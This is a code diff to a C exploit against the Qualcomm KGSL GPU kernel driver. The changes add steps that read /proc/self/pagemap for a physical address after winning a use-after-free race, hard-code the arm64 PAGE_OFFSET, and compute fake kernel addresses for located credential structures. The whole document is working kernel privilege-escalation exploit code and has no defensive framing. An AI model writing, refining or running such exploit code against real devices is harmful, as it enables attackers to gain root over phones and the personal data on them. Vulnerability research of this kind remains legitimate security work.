@@ -340,10 +340,6 @@ int main(int argc, char **argv) {
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("[*] Phase 1: Setup rbtree\n");
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    uint64_t uaf_gpuaddr = 0;
-    gpuobj_info(kgsl_fd, uaf_id, &uaf_gpuaddr, NULL);
-    printf("[*] UAF GPU address = 0x%lx\n", (unsigned long)uaf_gpuaddr);
-
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
     if (uaf_m == MAP_FAILED) die("mmap UAF");
@@ -383,6 +379,23 @@ int main(int argc, char **argv) {
 
     if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
     printf("[+] Race won! (errno=ENODEV)\n");
+
+    // --- Get physical address of OVERLAP_ADDR via pagemap (now it's mapped) ---
+    int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
+    if (pagemap_fd < 0) die("open pagemap");
+    uint64_t pagemap_entry;
+    off_t off = (OVERLAP_ADDR / 0x1000) * 8;
+    if (lseek(pagemap_fd, off, SEEK_SET) != off || read(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry)) != sizeof(pagemap_entry)) {
+        die("read pagemap for OVERLAP_ADDR");
+    }
+    if (!(pagemap_entry & 0x8000000000000000ULL)) {
+        printf("[-] OVERLAP_ADDR not present in pagemap\n");
+        return 1;
+    }
+    uint64_t pfn = pagemap_entry & 0x7FFFFFFFFFFFFFULL;
+    uint64_t overlap_base_pa = pfn << 12;
+    close(pagemap_fd);
+    printf("[*] OVERLAP base physical address = 0x%lx\n", (unsigned long)overlap_base_pa);
 
     printf("[*] Phase 3: Free UAF\n");
     gpuobj_free(kgsl_fd, uaf_id);
@@ -475,8 +488,9 @@ int main(int argc, char **argv) {
     int dw;
     unsigned int ts;
 
-    uint64_t page_offset = kernel_base - 0x80000000ULL; // Assume kernel base at physical 0x80000000
-    printf("[*] PAGE_OFFSET = 0x%lx\n", (unsigned long)page_offset);
+    // PAGE_OFFSET for arm64 with 39-bit VA is typically 0xFFFFFF8000000000
+    uint64_t page_offset = 0xFFFFFF8000000000ULL;
+    printf("[*] Using PAGE_OFFSET = 0x%lx\n", (unsigned long)page_offset);
 
     for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
@@ -513,8 +527,8 @@ int main(int argc, char **argv) {
             cred_pages[n_cred] = va;
             cred_offs[n_cred] = cred_off_found;
 
-            uint64_t pa_page = uaf_gpuaddr + (va - UAF_ADDR);
-            uint64_t kva_fake = page_offset + pa_page + 0xFB0;
+            uint64_t pa_cred = overlap_base_pa + (va - OVERLAP_ADDR);
+            uint64_t kva_fake = page_offset + pa_cred + 0xFB0;
             fake_sec_addrs[n_cred] = kva_fake;
             printf("  fake_sec_addr = 0x%lx\n", (unsigned long)fake_sec_addrs[n_cred]);
             n_cred++;
